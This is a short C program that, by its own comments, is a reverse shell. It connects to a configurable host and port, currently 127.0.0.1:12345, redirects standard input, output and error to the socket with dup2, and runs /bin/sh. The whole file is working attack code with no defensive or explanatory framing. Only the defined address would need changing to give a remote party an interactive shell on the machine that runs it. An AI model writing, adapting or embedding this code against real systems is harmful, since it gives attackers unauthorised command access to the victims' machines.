#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#define RPORT 12345
#define RHOST "127.0.0.1"

int main()
{
  struct sockaddr_in addr;
  int fd;

  //create socket fd
  fd = socket(AF_INET, SOCK_STREAM, 0);
  addr.sin_port = htons(RPORT); //set port to 12345
  addr.sin_addr.s_addr = inet_addr(RHOST);
  addr.sin_family = AF_INET;

  //connect to set IP address and port
  connect(fd, (struct sockaddr *) &addr, sizeof(addr));

  //duplicate file descriptors using dup2, which will feed stdin, stdout and stderr to reverse shell
  dup2(fd, 0);
  dup2(fd, 1);
  dup2(fd, 2);

  //finally create shell
  execve("/bin/sh", NULL, NULL);

}
